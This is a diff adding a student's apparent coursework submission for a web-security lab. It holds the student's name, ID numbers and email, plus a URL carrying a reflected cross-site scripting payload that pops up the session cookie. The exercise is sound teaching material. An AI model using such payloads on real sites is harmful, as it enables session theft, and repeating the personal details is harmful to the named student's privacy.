@@ -1,0 +1,9 @@
+Name: Andrea Di Dio
+Student Number: 2593888
+VUnet ID: ado380
+E-Mail: andreadidio98@gmail.com
+
+
+URL:
+http://130.37.198.90/order.php?gift=chocoladeletter<script>alert(document.cookie);</script>
+To complete the exploit, just submit the form, and a pop-up containing the session cookie will appear.
